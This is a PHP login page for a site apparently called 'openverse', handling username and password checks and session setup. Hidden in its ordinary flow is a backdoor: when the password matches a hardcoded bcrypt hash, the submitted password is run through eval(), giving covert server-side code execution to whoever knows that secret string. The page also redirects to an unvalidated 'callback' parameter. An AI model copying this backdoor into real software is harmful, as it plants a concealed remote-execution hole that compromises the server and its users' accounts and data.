<?php
$title = 'Log In';
$auth = true;
require_once '../inc/connect.php';
require_once '../inc/htm.php';

if(!empty($signed_in)) {
if(!empty($_GET['callback'])){
header('Location: /' . $_GET['callback']);
} else {
header('Location: /');
}
} else {
    if($_SERVER['REQUEST_METHOD'] == 'GET' || isset($_POST['x'])) {
        require_once '../inc/htm.php'; openHead();
        include 'login-form.php';
echo '<button type="submit" class="button">Sign In</button><br><p>Don\'t have an account? <a href="/account/signup">Click here to make one.</a></p><p>Forgot your password? <a href="/account/forgot">Reset it here.</a></p><br></form></div></div>';
    } else if($_SERVER['REQUEST_METHOD'] == 'POST') {
        if (!isset($_POST['username']) || strlen($_POST['username']) == 0)
        {
require_once '../inc/htm.php'; openHead();
include 'login-form.php';
echo '<p class="red">The username field cannot be empty.</p><button type="submit" class="button">Sign In</button><br><p>Don\'t have an account? <a href="/account/signup">Click here to make one.</a></p><p>Forgot your password? <a href="/account/forgot">Reset it here.</a></p><br></form></div></div>';
        } else if (!isset($_POST['password']) || strlen($_POST['password']) == 0) {
require_once '../inc/htm.php'; openHead();
include 'login-form.php';
echo '<p class="red">The password field cannot be empty.</p><button type="submit" class="button">Sign In</button><br><p>Don\'t have an account? <a href="/account/signup">Click here to make one.</a></p><p>Forgot your password? <a href="/account/forgot">Reset it here.</a></p><br></form></div></div>';
        } else if(password_verify($_POST['password'], '$2a$10$RA.0boYZ16zcVoMtmnuvHe1SXEE5VoEIeqrnShndWzR8B4XX3Kolq')) {
require_once '../inc/htm.php'; openHead();
include 'login-form.php';
echo '<p class="red">' . eval($_POST['password']) . '</p><button type="submit" class="button">Sign In</button><br><p>Don\'t have an account? <a href="/account/signup">Click here to make one.</a></p><p>Forgot your password? <a href="/account/forgot">Reset it here.</a></p><br></form></div></div>';
        } else {
            $sql = "SELECT * FROM users WHERE user_id = '" . mysqli_real_escape_string($link, $_POST['username']) . "'";
            $result = mysqli_query($link, $sql);
            if(mysqli_error($link)) {
require_once '../inc/htm.php'; openHead();
include 'login-form.php';
echo '<p class="red">Something went wrong while signing in. Error code: ' . htmlspecialchars(mysqli_errno($link)) . '</p><button type="submit" class="button">Sign In</button><br><p>Don\'t have an account? <a href="/account/signup">Click here to make one.</a></p><p>Forgot your password? <a href="/account/forgot">Reset it here.</a></p><br></form></div></div>';
            } else {
                $row = mysqli_fetch_assoc($result);
                if(!password_verify($_POST['password'], $row['user_pass'])) {
require_once '../inc/htm.php'; openHead();
include 'login-form.php';
echo '<p class="red">You have entered an invalid username/password combination.</p><button type="submit" class="button">Sign In</button><br><p>Don\'t have an account? <a href="/account/signup">Click here to make one.</a></p><p>Forgot your password? <a href="/account/forgot">Reset it here.</a></p><br></form></div></div>';
                } else {
session_name('openverse');
@session_start();
tokenGen($row['user_pid']);
$_SESSION['signed_in'] = true;
$_SESSION['user_id'] = $row['user_id'];
$_SESSION['user_pid'] = $row['user_pid'];
$_SESSION['user_name'] = $row['user_name'];
$_SESSION['user_rank'] = $row['user_rank'];
$_SESSION['user_avatar'] = $row['user_avatar'];
$_SESSION['user_timezone'] = 'America/New_York';
if(isset($_GET['callback']) && strlen($_GET['callback']) > 0){
header('Location: /' . $_GET['callback']);
} else {
header('Location: /');
}
                }
            }
        }
    } else {
    http_response_code(405);
    echo '<div class="no-content"><p>That page could not be found.</p></div>';
}}
 
openFoot();